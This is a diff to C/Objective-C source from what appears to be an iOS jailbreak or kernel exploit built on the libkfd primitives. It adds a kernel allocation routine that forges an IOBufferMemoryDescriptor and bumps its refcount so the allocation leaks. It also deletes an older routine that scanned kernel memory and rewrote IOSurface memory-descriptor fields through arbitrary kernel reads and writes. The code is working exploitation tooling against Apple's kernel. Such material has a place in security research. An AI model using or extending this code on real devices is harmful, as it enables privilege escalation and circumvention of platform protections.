@@ -6,7 +6,10 @@
 #include <os/log.h>
 #include "IOSurface_Primitives.h"
 #include "libkfd.h"
-
+#include "DriverKit.h"
+#define fail(message) NSLog(message); \
+kclose((struct kfd*)_kfd); \
+exit(EXIT_FAILURE);
 uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
 {
     uint64_t surfaceClientsArray = kread64_ptr_kfd(rootUserClient + 0x118);
@@ -170,78 +173,25 @@ static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
     IOSurfaceDecrementUseCount(surfaceRef);
     return port;
 }
+ uint64_t IOBufferKernelAlloc(uint64_t size, void **mappedAddr, bool leak)
+ {
+     mach_port_t buffer = IOBufferMemoryDescriptor_create(3, size, 0);
+     if(buffer == 0) {
+         fail(@"Failed to create IOBufferMemoryDescriptor!");
+     }
+     if(mappedAddr) {
+         *mappedAddr = (void*) IOMemoryDescriptor_map(buffer, 0, 0);
+     }
+     uint64_t kObject = ipc_entry_lookup(buffer);
+     if(kObject == 0) {
+         fail(@"Failed to get kObject!");
+     }
+     uint64_t memRanges = kread64_ptr_kfd(kObject + 0x60);
+     if(memRanges == 0) {
+         fail(@"Failed to get IOBufferMemoryDescriptor _ranges!");
+     }
+     uint32_t refcount = kread32_kfd(kObject + 0x8ULL);
+     kwrite32_kfd(kObject + 0x8ULL, refcount + 0x1337);
+     return kread64_ptr_kfd(memRanges);
+ }
 
-uint64_t KnivesKernelAlloc(uint64_t size, bool leak)
-{
-    // while (true) {
-    //     mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort(size);
-
-    //     uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
-    //     uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
-    //     uint64_t va = IOSurface_get_ranges(surface);
-
-    //     if (va == 0) continue;
-    //     if (leak) {
-    //         IOSurface_set_ranges(surface, 0);
-    //         IOSurface_set_rangeCount(surface, 0);
-    //     }
-
-    //     return va;
-    // }
-
-    uint64_t begin = get_kernel_proc();
-    uint64_t end = begin + 0x40000000;
-    uint64_t addr = begin;
-    while (addr < end) {
-        bool found = false;
-        for (int i = 0; i < size; i+=4) {
-            uint32_t val = kread32_kfd(addr);
-            found = true;
-            if (val != 0) {
-                found = false;
-                addr += i;
-                break;
-            }
-        }
-        if (found) {
-            while (true) 
-            {
-                NSLog(@"[+] dirty_kalloc working 0x%llx\n", addr);
-
-                mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);
-                uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
-                uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
-                uint64_t desc = IOSurface_get_memoryDescriptor(surface);
-                uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
-
-                kwrite64_kfd(ranges, addr);
-                kwrite64_kfd(ranges+8, size);
-
-                IOMemoryDescriptor_set_size(desc, size);
-                kwrite64_kfd(desc + 0x70, 0);
-                kwrite64_kfd(desc + 0x18, 0);
-                kwrite64_kfd(desc + 0x90, 0);
-
-                IOMemoryDescriptor_set_wired(desc, true);
-                uint32_t flags = IOMemoryDescriptor_get_flags(desc);
-                IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
-                IOMemoryDescriptor_set_memRef(desc, 0);
-                IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
-
-                NSLog(@"[+] should have addr at 0x%llx\n", ranges);
-                IOSurfaceDecrementUseCount(mappedSurfaceRef);
-
-                return ranges;    
-            }
-        }
-        addr += 0x1000;
-    }
-    if (addr >= end) 
-    {
-        NSLog(@"[-] failed to find free space in kernel\n");
-        exit(EXIT_FAILURE);
-    }
-
-
-    return 0;
-}
